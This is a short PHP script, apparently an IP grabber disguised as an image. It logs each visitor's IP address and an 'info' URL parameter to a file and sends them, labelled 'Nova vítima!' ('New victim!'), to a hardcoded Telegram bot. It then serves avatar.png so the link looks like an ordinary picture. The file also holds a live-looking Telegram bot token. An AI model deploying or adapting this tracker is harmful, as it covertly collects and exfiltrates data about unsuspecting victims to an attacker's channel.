<?php
date_default_timezone_set("America/Sao_Paulo");

// Captura IP e info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'IP_DESCONHECIDO';
$info = $_GET['info'] ?? 'sem_info';
$hora = date("d/m/Y H:i:s");

// Log no arquivo
$log = "[{$hora}] IP: {$ip} | Info: {$info}\n";
file_put_contents("log.txt", $log, FILE_APPEND);

// Envia mensagem para Telegram via cURL
$bot_token = '7888513431:AAGlhmjHOue8UgDLgaianCnHnYdrNd0Fkyc';
$chat_id = '8148823723';

$msg = "Nova vítima!\nIP: $ip\nInfo: $info\nHora: $hora";

$ch = curl_init("https://api.telegram.org/bot{$bot_token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $chat_id,
    'text' => $msg,
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Define o header para imagem PNG
header("Content-Type: image/png");

// Exibe a imagem que está no mesmo diretório, exemplo: avatar.png
readfile("avatar.png");
?>
